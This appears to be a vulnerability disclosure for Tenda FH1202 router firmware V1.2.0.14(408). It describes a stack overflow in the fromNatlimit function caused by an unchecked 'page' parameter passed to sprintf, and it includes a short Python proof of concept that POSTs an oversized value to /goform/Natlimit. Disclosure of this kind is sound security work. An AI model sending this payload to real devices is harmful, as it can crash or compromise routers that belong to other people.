# Tenda FH1202 fromNatlimit
### Overview
vendor: Tenda
product: FH1202
version: V1.2.0.14(408)
type: Stack Overflow
### Vulnerability Description
Tenda FH1202 V1.2.0.14(408) were discovered to contain a stack overflow via the page parameter in the fromNatlimit function.
### Vulnerability details
In function fromNatlimit line 10, it reads in a user-provided parameter `page`, and the variable is passed to the sprintf function without any length check, which may overflow the stack-based buffer s. As a result, by requesting the page, an attacker can easily execute a denial of service attack or remote code execution.

![](images/4.png)

### POC
```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/Natlimit"

data = {
    "page": "a" * 1000
}

response = requests.post(url, data=data)
print(response.text)
```

![](images/6.png)
